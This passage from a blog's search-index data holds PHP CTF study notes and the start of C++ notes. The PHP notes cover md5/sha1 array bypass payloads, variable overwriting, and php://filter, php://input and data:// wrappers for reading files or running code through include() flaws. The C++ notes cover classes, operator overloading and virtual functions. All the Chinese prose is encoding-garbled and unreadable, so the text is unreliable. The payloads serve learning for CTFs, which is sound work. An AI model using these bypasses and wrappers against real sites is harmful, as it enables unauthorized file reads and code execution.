\u0026#34;flag{THIS_IS_REAL_FLAG}\u0026#34;; $str1 = $_GET[\u0026#34;gat\u0026#34;]; $str2 = $_GET[\u0026#34;tag\u0026#34;]; if((string)$str1 !== (string)$str2 \u0026amp;\u0026amp; md5($str1)===md5($str2)){ echo \u0026#34;flag{THIS_IS_REAL_FLAG}\u0026#34;; }else{ echo \u0026#34;Out!\u0026#34;; } è¿™æ—¶å€™å°±å¾—éœ€è¦ md5 ç¢°æ’ï¼Œä¸Šé¢åˆ¤æ–­æ¡ä»¶çš„æ„æ€æ˜¯ï¼Œstr1 å’Œ str2 å†…å®¹å¿…é¡»ä¸åŒï¼Œä½†æ˜¯ md5 å¿…é¡»ç›¸åŒ(è¯¦ç»†æ–¹æ³•å¾…æ•´ç†)\nsha1()\nsha1 çš„å‚æ•°ä¸èƒ½ä¸ºæ•°ç»„ï¼Œä¼ å…¥æ•°ç»„ä¼šè¿”å› NULL\n1 2 3 4 5 6 7 8 9 $flag = \u0026#34;flag{Chain!}\u0026#34;; $get = $_GET[\u0026#39;get\u0026#39;]; $teg = $_GET[\u0026#39;teg\u0026#39;]; if ($get != $teg \u0026amp;\u0026amp; sha1($get) === sha1($teg)) { #if ($get != $teg \u0026amp;\u0026amp; sha1($get) == sha1($teg)) { echo $flag; }else{ echo \u0026#39;Out!\u0026#39;; } Payload: ?get[]=\u0026amp;teg[]=1\nå˜é‡è¦†ç›–æ¼æ´\nç¯å¢ƒå¾—å…ˆå¼€å¯\nregister_globals=ON //æ­¤æ—¶ä¼ é€’çš„å‚æ•°ä¼šè‡ªåŠ¨æ³¨å†Œä¸ºå…¨å±€å˜é‡\ræœ€ç®€å•çš„ä¸€ç§å°±æ˜¯æˆ‘ä»¬ä¼ å…¥å‚æ•°ä¾‹å¦‚ ?id=1 æŠŠåŸæ¥idçš„å€¼ç»™æ›¿æ¢\n$$\nç±»ä¼¼äºc++çš„æŒ‡é’ˆ,ä¾‹å¦‚:\n1 2 3 4 5 6 7 8 9 10 11 $a = \u0026#34;A\u0026#34;; # $b = \u0026#34;B\u0026#34;; # echo $a . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo $b . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; foreach ($_GET as $key =\u0026gt; $value) { $$key = $value; } echo $a . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo $b . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo $key . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo $$key . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; ä¼ å…¥\n?a=I'm A\u0026amp;b=I'm B å,å¾—åˆ°\nA\rB\rI'm A\rI'm B\rb\rI'm B\rè¿™é‡Œä½¿ç”¨äº† foreach æ¥éå†æ•°ç»„çš„å€¼,éå† I'm B åˆ°è¿™ä¸€é¡¹,åé¢çš„ä»£ç è¡¨ç¤ºæŠŠæ•°ç»„çš„é”®åbèµ‹å€¼ç»™key,æ•°ç»„çš„é”®å€¼èµ‹å€¼ç»™value,å¹¶ä¸”keyå¯ä»¥æŒ‡å‘value\nå°±å½“æˆæŒ‡é’ˆç†è§£å§[]`(ï¿£â–½ï¿£)\u0026rsquo;*\nextract()\næè¿°ï¼šextract(array,flags,prefix)\nåŠŸèƒ½â€‹ï¼šå°†æ•°ç»„å…ƒç´ åŠ¨æ€è½¬æ¢ä¸ºå˜é‡ï¼Œå¸¸ç”¨äºå¤„ç†è¡¨å•æ•°æ®ï¼ˆå¦‚ $_POSTã€$_GETï¼‰æˆ–é…ç½®æ•°ç»„ã€‚\nflags: å¯é€‰ï¼Œæ§åˆ¶å†²çªå¤„ç†æ–¹å¼ï¼ˆé»˜è®¤ EXTR_OVERWRITE) å¸¸ç”¨å€¼ï¼š\nEXTR_OVERWRITEï¼šå¦‚æœæœ‰å†²çª,è¦†ç›–å·²æœ‰å˜é‡ EXTR_SKIPï¼šè·³è¿‡å†²çª EXTR_PREFIX_ALLï¼šå¦‚æœæœ‰å†²çª,ä¸ºæ‰€æœ‰å˜é‡æ·»åŠ å‰ç¼€ prefix: å¯é€‰ï¼Œä»…åœ¨æŒ‡å®šflagsä¸ºå‰ç¼€æ¨¡å¼æ—¶æœ‰æ•ˆï¼Œç”¨äºç”Ÿæˆå˜é‡åå‰ç¼€ã€‚\nparse_str()\næè¿°ï¼šparse_str(str) ç”¨äºå°†å­—ç¬¦ä¸²è§£ææˆå¤šä¸ªå˜é‡ï¼Œæ²¡æœ‰è¿”å›å€¼ã€‚ç®€è€Œè¨€ä¹‹,å°±æ˜¯ä½ è¾“å…¥(\u0026ldquo;a=1\u0026amp;b=2\u0026rdquo;)å®ƒä¼šè‡ªåŠ¨åœ°ç”Ÿæˆa,bä¸¤ä¸ªå˜é‡\nä¼ªåè®®\nphp://filter\nphp://filter/read or write=/resource=æ•°æ®æµ\rresource=\u0026lt; è¦è¿‡æ»¤çš„æ•°æ®æµ\u0026gt; ï¼ˆå¿…é¡»ï¼‰ å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµ\nreadå’Œwriteå¯é€‰å¯¹åº”å¯¹ç­›é€‰åˆ—è¡¨çš„æ“ä½œ\nå¸¸ç”¨è¿‡æ»¤å™¨convert.base64\nç¼–ç  convert.base64-encode è§£ç  convert.base64-decode ä¾‹å¦‚\nphp://filter/read=convert.base64-encode/resource=files.txt\ræ›´å¤šçš„å¯ä»¥çœ‹Pç¥çš„è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨\nphp://input\nå¦‚æœ html è¡¨å•ç¼–ç è®¾ç½®ä¸º\u0026quot;multipart/form-data\u0026quot;,è¯·æ±‚æ˜¯æ— æ•ˆçš„ã€‚ ä¸€èˆ¬åœ¨ CTF ä¸­ç”¨äºæ‰§è¡Œ php ä»£ç ï¼ˆä¸€èˆ¬åœ¨bpé‡Œä½¿ç”¨ï¼‰\néœ€è¦åœ¨php ä¸­è®¾ç½® allow_url_include = On\nzip:// \u0026amp; bzip2 \u0026amp; zlib://\néœ€è¦:\nallow_url_fopen: on\nallow_url_include: on\nzipçš„ä¸€èˆ¬æ ¼å¼:\nzip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]ï¼ˆ#ç¼–ç ä¸º%23ï¼‰\rfile://\nç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨ CTF ä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶\ndata://\nå¸¸ç”¨äºç»•è¿‡php://è¿‡æ»¤ï¼Œç›´æ¥æ‰§è¡ŒPHPä»£ç \nè¯­æ³•ï¼š\ndata:[\u0026lt;mediatype\u0026gt;][;charset=\u0026lt;encoding\u0026gt;][;base64],\u0026lt;data\u0026gt;\râ€‹- mediatypeâ€‹ï¼šæ•°æ®ç±»å‹ï¼ˆå¦‚text/plainã€image/pngã€text/htmlï¼‰ã€‚\nâ€‹- charsetâ€‹ï¼šå­—ç¬¦ç¼–ç ï¼ˆå¦‚utf-8ï¼‰ã€‚\nâ€‹- base64â€‹ï¼šè‹¥æ•°æ®éœ€ç¼–ç åˆ™æ·»åŠ æ­¤æ ‡è¯†ã€‚\nâ€‹- dataâ€‹ï¼šå®é™…å†…å®¹ï¼ˆå¦‚PHPä»£ç æˆ–æ–‡ä»¶è·¯å¾„ï¼‰ã€‚\néœ€å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´(å¦‚ include($_GET['file']) )å’Œæ‰“å¼€ä¸¤ä¸ª_url_\nåºåˆ—åŒ–åŠååºåˆ—åŒ– åºåˆ—åŒ– æ˜¯å°† PHP å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„è¿‡ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ serialize() å‡½æ•°æ¥å®ç°ã€‚è¯¥å‡½æ•°å°†å¯¹è±¡çš„çŠ¶æ€ä»¥åŠå®ƒçš„ç±»åå’Œå±æ€§å€¼ç¼–ç ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å¯ä»¥å­˜å‚¨åœ¨æ–‡ä»¶ä¸­ï¼Œå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œæˆ–è€…é€šè¿‡ç½‘ç»œä¼ è¾“åˆ°å…¶ä»–åœ°æ–¹ã€‚\nååºåˆ—åŒ– æ˜¯å°†åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²è½¬æ¢å› PHP å¯¹è±¡çš„è¿‡ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ unserialize() å‡½æ•°æ¥å®ç°ã€‚è¯¥å‡½æ•°ä¼šå°†åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è§£ç ï¼Œå¹¶å°†å…¶è½¬æ¢å›åŸå§‹çš„ PHP å¯¹è±¡ã€‚\næ™®é€šå¯¹è±¡æ³¨æ„ protected å’Œ private ç±»å‹çš„å˜é‡ä¸­éƒ½åŠ å…¥äº†ä¸å¯è§å­—ç¬¦ï¼š\nå¦‚æœæ˜¯ protected å˜é‡ï¼Œåˆ™ä¼šåœ¨å˜é‡åå‰åŠ ä¸Š \\x00*\\x00\nå¦‚æœæ˜¯ private å˜é‡ï¼Œåˆ™ä¼šåœ¨å˜é‡åå‰åŠ ä¸Š \\x00ç±»å\nä¸€èˆ¬æˆ‘ä»¬åœ¨è¾“å‡ºçš„æ—¶å€™éƒ½ä¼šå…ˆç¼–ç åè¾“å‡º\nè‡ªå®šä¹‰ç±»æ—¶ï¼Œä¾‹å¦‚ï¼š\n1 2 3 4 5 6 7 public function serialize() { return serialize([ \u0026#39;name\u0026#39; =\u0026gt; $this-\u0026gt;name, \u0026#39;email\u0026#39; =\u0026gt; $this-\u0026gt;email, \u0026#39;phoneNumber\u0026#39; =\u0026gt; $this-\u0026gt;phoneNumber, ]); } æ­¤æ—¶è¾“å‡ºçš„æ ¼å¼å¦‚å›¾ï¼š\nby hello ctf\nå…¶å®ƒä¸€äº›æ ‡è¯†ï¼Œä¸€èˆ¬éƒ½æ˜¯è‹±æ–‡é¦–å­—æ¯\nb:boolean bool å€¼\nC:custom object è‡ªå®šä¹‰å¯¹è±¡åºåˆ—åŒ–\nd:double å°æ•°\ni:integer æ•´æ•°\nO:Object å¯¹è±¡\nr:reference å¯¹è±¡å¼•ç”¨ \u0026amp;\u0026amp; R:pointer reference æŒ‡é’ˆå¼•ç”¨\nS:encoded string\nN:null NULL å€¼\né­”æœ¯æ–¹æ³•\nåœ¨ PHP çš„åºåˆ—åŒ–ä¸­ï¼Œé­”æœ¯æ–¹æ³•ï¼ˆMagic Methodsï¼‰æ˜¯ä¸€ç»„ç‰¹æ®Šçš„æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•ä»¥åŒä¸‹åˆ’çº¿ï¼ˆ__ï¼‰ä½œä¸ºå‰ç¼€ï¼Œå¯ä»¥åœ¨ç‰¹å®šçš„åºåˆ—åŒ–é˜¶æ®µè§¦å‘ä»è€Œä½¿å¼€å‘è€…èƒ½å¤Ÿè¿›ä¸€æ­¥çš„æ§åˆ¶ åºåˆ—åŒ– / ååºåˆ—åŒ– çš„è¿‡ç¨‹ã€‚\nä¸€èˆ¬åœ¨é¢˜ç›®ä¸­å¸¸è§çš„å‡ ä¸ªæ–¹æ³•å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 __wakeup() //------ æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•° __sleep() //------- æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œåªèƒ½è¿”å›æ•°ç»„ __construct() //------- é€‚åˆåœ¨ä½¿ç”¨å¯¹è±¡ä¹‹å‰åšä¸€äº›åˆå§‹åŒ–å·¥ä½œ __destruct() //---- æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œ __call() //-------- åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __callStatic() //-- åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __get() //--------- ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®æˆ–è€…ä¸å­˜åœ¨è¿™ä¸ªé”®éƒ½ä¼šè°ƒç”¨æ­¤æ³• __set() //--------- ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§ __isset() //------- åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ __unset() //------- åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘ __toString() //---- æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ __invoke() //------ å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ è¯¦ç»†å¯å‚è€ƒï¼šPHP:é­”æœ¯æ–¹æ³• - Manual\nå±æ€§é‡è½½\nåœ¨ç»™ä¸å¯è®¿é—®ï¼ˆprotected æˆ– privateï¼‰æˆ–ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼æ—¶ï¼Œ__set() ä¼šè¢«è°ƒç”¨ã€‚ è¯»å–ä¸å¯è®¿é—®ï¼ˆprotected æˆ– privateï¼‰æˆ–ä¸å­˜åœ¨çš„å±æ€§çš„å€¼æ—¶ï¼Œ__get() ä¼šè¢«è°ƒç”¨ã€‚ å½“å¯¹ä¸å¯è®¿é—®ï¼ˆprotected æˆ– privateï¼‰æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨ isset() æˆ– empty() æ—¶ï¼Œ__isset() ä¼šè¢«è°ƒç”¨ã€‚ å½“å¯¹ä¸å¯è®¿é—®ï¼ˆprotected æˆ– privateï¼‰æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨ unset() æ—¶ï¼Œ__unset() ä¼šè¢«è°ƒç”¨ã€‚ è¯¦ç»†å¯å‚è€ƒï¼šPHP:é‡è½½ - Manual\næœ¬æ–‡å‚è€ƒèµ„æ–™:Hello CTF (å…¶å®å°±æ˜¯æ‘˜æŠ„å•¦)\n","date":"2025-05-07T00:00:00Z","permalink":"https://example.com/p/php/","title":"php"},{"content":"å…³äºå˜é‡ å¸¸é‡\n1 2 3 4 5 const typename var = val; å£°æ˜å¸¸é‡ char * const p è¡¨ç¤ºæŒ‡é’ˆ p æŒ‡å‘çš„ä½ç½®ä¸èƒ½æ”¹å˜ï¼Œä½†æ˜¯æŒ‡å‘çš„å†…å®¹ï¼ˆä¸€ä¸ª charï¼‰å¯ä»¥æ”¹å˜ const char *p è¡¨ç¤ºæŒ‡é’ˆ p æŒ‡å‘çš„å†…å®¹ä¸èƒ½æ”¹å˜ï¼Œä½†æ˜¯æŒ‡å‘çš„ä½ç½®å¯ä»¥æ”¹å˜ char const *p åŒç†ç­‰ä»· const char * const p p æŒ‡å‘çš„ä½ç½®å’Œå†…å®¹éƒ½ä¸èƒ½ä¿®æ”¹ åŠ¨æ€å†…å­˜\nä½¿ç”¨ new åˆ†é…ï¼Œåˆ›å»ºå¯¹è±¡ï¼Œè¿”å›æŒ‡é’ˆ\n1 2 3 T *p = new T[N] åˆ†é… N ä¸ª T ç±»å‹çš„å¯¹è±¡ï¼Œè¿”å›æŒ‡å‘ç¬¬ä¸€ä¸ªå¯¹è±¡çš„æŒ‡é’ˆ delete p é‡Šæ”¾ p æŒ‡å‘çš„å†…å­˜ p æœ¬èº«ä¸ä¼šå˜ä¸º NULL delete[] p é‡Šæ”¾ p æŒ‡å‘çš„å†…å­˜ å…³äºç±» -C++ ä¸­ class å’Œ struct å¹¶æ— æœ¬è´¨åŒºåˆ«ï¼Œåªæ˜¯é»˜è®¤çš„è®¿é—®æƒé™ä¸åŒï¼ˆclass é»˜è®¤ privateï¼Œstruct é»˜è®¤ publicï¼‰\n:: ç§°ä¸ºåŸŸè§£æå™¨ï¼ˆresolverï¼‰ï¼Œå‰é¢ä»€ä¹ˆéƒ½ä¸å¸¦åˆ™è§£æåˆ°è‡ªç”±å˜é‡ / å‡½æ•°ï¼ˆå³å…¨å±€ä½œç”¨åŸŸå†…ï¼‰\næˆå‘˜å‡½æ•°ç›´æ¥åœ¨ç±»å†…éƒ¨å®šä¹‰çš„è¯é»˜è®¤ä¸º inlineï¼ˆä¸æ¨èï¼‰\næƒé™æœ‰ä¸‰ç§ï¼š\npublicï¼šå…¬æœ‰ privateï¼šç§æœ‰ï¼ˆåªæœ‰åŒç±»å¯ä»¥è®¿é—®ï¼‰ æ³¨æ„è¾¹ç•Œæ˜¯ç±»ä¸æ˜¯å¯¹è±¡ï¼Œæˆå‘˜å‡½æ•°ä¸­å¯ä»¥è®¿é—®åŒä¸€ç±»çš„å…¶ä»–å¯¹è±¡çš„ç§æœ‰æˆå‘˜ protectedï¼šä¿æŠ¤ï¼ˆåªæœ‰åŒç±»å’Œå­ç±»å¯ä»¥è®¿é—®ï¼‰ æ„é€ å‡½æ•° å‘½åä¸ç±»åå®Œå…¨ç›¸åŒ\næ„é€ å‡½æ•°åç§°å¿…é¡»ä¸ç±»åä¸€è‡´ï¼Œæ— è¿”å›å€¼ï¼ˆåŒ…æ‹¬ voidï¼‰ã€‚\nè‡ªåŠ¨è°ƒç”¨\nå¯¹è±¡åˆ›å»ºæ—¶ç”±ç¼–è¯‘å™¨è‡ªåŠ¨è°ƒç”¨ï¼Œæ— éœ€æ˜¾å¼è°ƒç”¨ã€‚\nå¯é‡è½½\næ”¯æŒå¤šä¸ªæ„é€ å‡½æ•°ï¼Œé€šè¿‡å‚æ•°åˆ—è¡¨ï¼ˆç±»å‹ã€æ•°é‡ã€é¡ºåºï¼‰åŒºåˆ†ã€‚\nè®¿é—®æ§åˆ¶\nå¯è®¾ä¸º publicã€protected æˆ– privateï¼Œå½±å“å¯¹è±¡åˆ›å»ºæ–¹å¼ï¼ˆå¦‚å•ä¾‹æ¨¡å¼ï¼‰ã€‚\nè¯­æ³•\nä»¥å†’å· : å¼€å¤´ï¼Œåè·Ÿæˆå‘˜å˜é‡åŠå…¶åˆå§‹åŒ–è¡¨è¾¾å¼ï¼š\n1 2 3 4 5 6 7 class Student { public: Student(int id, const string\u0026amp; name) : studentId(id), studentName(name) {} private: const int studentId; // å¿…é¡»ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨ string studentName; }; å¿…è¦æ€§\nå¯¹constæˆå‘˜ã€å¼•ç”¨æˆå‘˜ã€æ— é»˜è®¤æ„é€ å‡½æ•°çš„ç±»æˆå‘˜å¿…é¡»ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨ã€‚ æé«˜æ€§èƒ½ï¼šé¿å…å…ˆé»˜è®¤åˆå§‹åŒ–å†èµ‹å€¼çš„é¢å¤–å¼€é”€ã€‚ è¿ç®—ç¬¦é‡è½½ è¿ç®—ç¬¦é‡è½½é€šè¿‡å®šä¹‰operatorå‡½æ•°å®ç°ï¼Œæ”¯æŒå¤§éƒ¨åˆ†å†…ç½®è¿ç®—ç¬¦ï¼ˆå¦‚+ã€-ã€==ç­‰ï¼‰ï¼Œä½†éƒ¨åˆ†è¿ç®—ç¬¦ï¼ˆå¦‚.ã€::ã€?:ï¼‰ä¸å¯é‡è½½ã€‚\nç¤ºä¾‹ï¼š\n1 2 3 4 5 6 class Complex { public: Complex operator+(const Complex\u0026amp; other) { return Complex(real + other.real, imag + other.imag); } }; è‹¥ä¸æ˜¯ç±»å¯¹è±¡ä¹‹é—´çš„ç›¸åŠ æ—¶ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•å®ç°ï¼š\n1 2 3 4 5 6 class Complex { public: Complex operator+(int num) { return Complex(this-\u0026gt;real + num); } }; è¯¥æ–¹æ³•å¯ä»¥å®ç°intåœ¨å³ä¾§ç›¸åŠ ï¼Œè‹¥intåœ¨å·¦ä¾§æ—¶åˆ™éœ€é€šè¿‡å…¨å±€å‡½æ•°æˆ–å‹å…ƒå‡½æ•°é‡è½½ï¼Œå› æˆå‘˜å‡½æ•°æ— æ³•è®©intä½œä¸ºå·¦æ“ä½œæ•°\nç¤ºä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 class MyClass { public: int value; MyClass(int v) : value(v) {} // å£°æ˜å‹å…ƒå‡½æ•°ä»¥è®¿é—®ç§æœ‰æˆå‘˜ï¼ˆå¦‚æœéœ€è¦ï¼‰ friend MyClass operator+(int num, const MyClass\u0026amp; obj); }; // å…¨å±€å‡½æ•°é‡è½½ï¼šå¤„ç† int + MyClass MyClass operator+(int num, const MyClass\u0026amp; obj) { return MyClass(num + obj.value); } // ä½¿ç”¨ç¤ºä¾‹ MyClass c = 3 + a; // è°ƒç”¨å…¨å±€å‡½æ•° å¤„ç†è‡ªå¢è‡ªå‡æ—¶æ ¼å¼ç•¥æœ‰ä¸åŒï¼Œä½†æ˜¯ä¸éš¾ç†è§£\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Number { public: int value; Number(int v = 0) : value(v) {} // å‰ç½®++ Number\u0026amp; operator++() { ++value; return *this; } // åç½®++ Number operator++(int) { Number temp = *this; ++value; return temp; } }; æµè¿ç®—ç¬¦é‡è½½ æµè¿ç®—ç¬¦ç”¨äºè‡ªå®šä¹‰ç±»å‹ä¸è¾“å…¥è¾“å‡ºæµçš„äº¤äº’ï¼Œä½¿å¯¹è±¡å¯ç›´æ¥é€šè¿‡coutè¾“å‡ºæˆ–cinè¾“å…¥ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 class Point { public: friend ostream\u0026amp; operator\u0026lt;\u0026lt;(ostream\u0026amp; os, const Point\u0026amp; p) { os \u0026lt;\u0026lt; \u0026#34;(\u0026#34; \u0026lt;\u0026lt; p.x \u0026lt;\u0026lt; \u0026#34;, \u0026#34; \u0026lt;\u0026lt; p.y \u0026lt;\u0026lt; \u0026#34;)\u0026#34;; return os; } friend istream\u0026amp; operator\u0026gt;\u0026gt;(istream\u0026amp; is, Point\u0026amp; p) { is \u0026gt;\u0026gt; p.x \u0026gt;\u0026gt; p.y; return is; } private: int x, y; }; è™šå‡½æ•° å­¦çš„æ—¶å€™æ„Ÿè§‰æŒºç®€å•çš„ï¼Œå¥½ä¹…ä¸ç”¨æå¿˜äº†ï¼Œè¿˜æ˜¯å†™ç‚¹ç¬”è®°å§ã€‚\nè™šå‡½æ•°ä¸»è¦æä¾› è¿è¡Œæ—¶å¤šæ€ï¼Œå®ƒè®© C++ ç¨‹åºèƒ½å¤Ÿæ ¹æ®å¯¹è±¡çš„å®é™…ç±»å‹æ¥è°ƒç”¨å‡½æ•°ï¼Œè€Œä¸æ˜¯æ ¹æ®æŒ‡é’ˆ/å¼•ç”¨çš„é™æ€ç±»å‹ã€‚\næ¢å¥è¯è¯´ï¼š\næ™®é€šå‡½æ•° â†’ ç¼–è¯‘æœŸç»‘å®šï¼ˆå‡½æ•°åœ°å€åœ¨ç¼–è¯‘é˜¶æ®µå°±å†³å®šäº†ï¼‰ã€‚\nè™šå‡½æ•° â†’ è¿è¡ŒæœŸç»‘å®šï¼ˆå‡½æ•°åœ°å€åœ¨è¿è¡Œæ—¶é€šè¿‡è™šå‡½æ•°è¡¨æŸ¥æ‰¾ï¼‰ã€‚\nè¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºé€šç”¨æ¥å£ï¼Œåœ¨ä¸åŒå­ç±»é‡Œå®ç°ä¸åŒçš„è¡Œä¸ºã€‚\nå¤šæ€ æ¯”å¦‚åŸºç±» Shape å®šä¹‰ draw()ï¼Œä¸åŒå­ç±»ï¼ˆCircleã€Rectangleï¼‰éƒ½å¯ä»¥é‡å†™è‡ªå·±çš„ draw()ï¼Œè¿è¡Œæ—¶è°ƒç”¨æ—¶è‡ªåŠ¨é€‰æ‹©æ­£ç¡®çš„å‡½æ•°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include \u0026lt;iostream\u0026gt; using namespace std; class Shape { public: virtual void draw() { cout \u0026lt;\u0026lt; \u0026#34;Draw Shape\\n\u0026#34;; } }; class Circle : public Shape { public: void draw() override { cout \u0026lt;\u0026lt; \u0026#34;Draw Circle\\n\u0026#34;; } //overrideç”¨æ¥æ ‡è®°â€œæ´¾ç”Ÿç±»ä¸­çš„è™šå‡½æ•°æ˜¯å¯¹åŸºç±»è™šå‡½æ•°çš„é‡å†™â€ }; class Rectangle : public Shape { public: void draw() override { cout \u0026lt;\u0026lt; \u0026#34;Draw Rectangle\\n\u0026#34;; } }; int main() { Shape* s1 = new Circle(); Shape* s2 = new Rectangle(); s1-\u0026gt;draw(); // Draw Circle s2-\u0026gt;draw(); // Draw Rectangle delete s1; delete s2; } æŠ½è±¡æ¥å£ï¼ˆçº¯è™šå‡½æ•°ï¼‰ è™šå‡½æ•°å¯ä»¥è¢«å®šä¹‰ä¸º çº¯è™šå‡½æ•°ï¼ˆ=0ï¼‰ï¼Œä½¿ç±»å˜ä¸º æŠ½è±¡ç±»ï¼Œåªèƒ½ä½œä¸ºæ¥å£å­˜åœ¨ï¼Œä¸èƒ½ç›´æ¥å®ä¾‹åŒ–ã€‚ æ´¾ç”Ÿç±»å¿…é¡»å®ç°çº¯è™šå‡½æ•°ã€‚\n1 2 3 4 5 6 7 8 9 class Animal { public: virtual void speak() = 0; // çº¯è™šå‡½æ•° }; class Dog : public Animal { public: void speak() override { cout \u0026lt;\u0026lt; \u0026#34;Woof!\\n\u0026#34;; } }; æ­£ç¡®çš„ææ„å‡½æ•°è°ƒç”¨ å¦‚æœåŸºç±»çš„ææ„å‡½æ•°æ˜¯è™šå‡½æ•°ï¼Œé‚£ä¹ˆé€šè¿‡åŸºç±»æŒ‡é’ˆåˆ é™¤æ´¾ç”Ÿç±»å¯¹è±¡æ—¶ï¼Œä¼š å…ˆè°ƒç”¨æ´¾ç”Ÿç±»ææ„ï¼Œå†è°ƒç”¨åŸºç±»ææ„ ï¼Œé¿å…èµ„æºæ³„æ¼ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Base { public: virtual ~Base() { cout \u0026lt;\u0026lt; \u0026#34;Base destroyed\\n\u0026#34;; } }; class Derived : public Base { public: ~Derived() { cout \u0026lt;\u0026lt; \u0026#34;Derived destroyed\\n\u0026#34;; } }; int main() { Base* b = new Derived(); delete b; } å¦‚æœææ„å‡½æ•°ä¸æ˜¯è™šå‡½æ•°ï¼Œåªä¼šè°ƒç”¨ Base::~Baseï¼Œå¯¼è‡´ Derived éƒ¨åˆ†èµ„æºæ³„éœ²ã€‚\nå“ˆå¸Œè¡¨ ä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è¯´ä¸ç®—c++çš„ç‰ˆå—ï¼Œä½†æ˜¯åˆ·é¢˜çš„æ—¶å€™ç¢°åˆ°äº†ï¼Œå°±é¡ºä¾¿è®°ä¸€ä¸‹ã€‚\nå“ˆå¸Œè¡¨æ˜¯ä¸€ç§æ ¹æ®å…³é”®å­—ç›´æ¥è®¿é—®å†…å­˜å­˜å‚¨ä½ç½®çš„æ•°æ®ç»“æ„ã€‚é€šè¿‡å“ˆå¸Œè¡¨ï¼Œæ•°æ®å…ƒç´ çš„å­˜æ”¾ä½ç½®å’Œæ•°æ®å…ƒç´ çš„å…³é”®å­—ä¹‹é—´å»ºç«‹èµ·æŸç§å¯¹åº”å…³ç³»ï¼Œå»ºç«‹è¿™ç§å¯¹åº”å…³ç³»çš„å‡½æ•°ç§°ä¸ºå“ˆå¸Œå‡½æ•°ã€‚\nå“ˆå¸Œè¡¨é€šå¸¸ä½¿ç”¨ä¸€ä¸ªæ•°ç»„ä½œä¸ºåº•å±‚å­˜å‚¨ï¼Œæ•°ç»„çš„æ¯ä¸ªå…ƒç´ ç§°ä¸ºä¸€ä¸ªæ¡¶ï¼ˆbucketï¼‰ï¼Œå®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ ç”¨ç©ºé—´æ¢æ—¶é—´,æ‰€ä»¥å®ƒçš„ æ’å…¥ã€åˆ é™¤ã€æŸ¥æ‰¾æ“ä½œçš„å¹³å‡æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯ O(1)ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼ŒC++ STL æä¾›çš„ std::unordered_map å’Œ std::unordered_set å·²ç»å®ç°äº†é«˜æ•ˆã€å¥å£®çš„å“ˆå¸Œè¡¨ï¼Œé€šå¸¸ä¸éœ€è¦æˆ‘ä»¬è‡ªå·±å»å®ç°ã€‚\nç®€å•ä¸€ç‚¹çš„å®ç°æ˜¯ï¼š\nstd::unordered_set (é›†åˆ) ç”¨äºå¿«é€ŸæŸ¥æ‰¾ä¸€ä¸ªå…ƒç´ æ˜¯å¦å­˜åœ¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 #include 